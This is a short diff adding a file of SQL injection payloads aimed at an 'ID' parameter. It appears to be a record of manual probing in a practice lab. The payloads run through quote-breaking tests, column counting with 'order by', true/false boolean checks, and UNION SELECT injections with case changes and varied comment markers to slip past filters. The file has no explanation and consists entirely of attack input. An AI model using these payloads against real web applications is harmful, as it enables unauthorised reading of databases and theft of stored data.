@@ -1,0 +1,37 @@
+ID:1
+ID:1
+ID:1'
+ID:1 order by 1-- 
+ID:1 order by 2-- 
+ID:1 order by 3-- 
+ID:1 order by 4-- 
+ID:1 order by 3-- 
+ID:1 and 1=1
+ID:1 and 1=2
+ID:1
+ID:'union select 1,2,3
+ID:'union select 1,2,3-- 
+ID:'uniOn select 1,2,3-- 
+ID:'uniOn select 1,2,323%
+ID:'uniOn select 1,2,3 23%
+ID:'uniOn select 1,2,3#
+ID:'uniOn select 1,2,3-- 
+ID:1'uniOn select 1,2,3-- 
+ID:1'uniOn select 1,2,3-- 
+ID:1'uniOn select 1,2,3-- 
+ID:1uniOn select 1,2,3-- 
+ID:1uniOn select 1,2,3-- 
+ID:1uniOn select 1,2,3-- 
+ID:1uniOn select 1,2,3-- 
+ID:1'uniOn select 1,2,3-- 
+ID:1"uniOn select 1,2,3-- 
+ID:1')
+ID:1'
+ID:1'-- 
+ID:1'-- 
+ID:1
+ID:1'
+ID:1 and 1=1
+ID:1 and 1=2
+ID:1 and 1=2 union select 1,2,3-- 
+ID:9999 union select 1,2,3-- 
